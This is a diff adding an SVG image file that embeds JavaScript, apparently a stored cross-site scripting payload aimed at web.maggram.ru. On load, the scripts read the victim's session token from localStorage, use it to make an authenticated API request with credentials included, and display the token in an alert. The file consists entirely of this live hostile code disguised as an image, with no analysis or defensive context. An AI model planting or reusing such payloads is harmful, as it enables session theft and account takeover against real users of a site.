@@ -1,0 +1,17 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+    <script>fetch("http://web.maggram.ru/api/users/b6cccda3-a895-4b65-b788-db05e9b85651/posts", {
+  "headers": {
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "ru,ru-RU;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6",
+    "authorization": `Bearer ${window.localStorage.token}`,
+    "cache-control": "no-cache",
+    "pragma": "no-cache"
+  },
+  "referrer": "http://web.maggram.ru/profile",
+  "body": null,
+  "method": "GET",
+  "mode": "cors",
+  "credentials": "include"
+});</script>
+    <script>alert(`token: ${window.localStorage.token}`)</script>
+</svg>
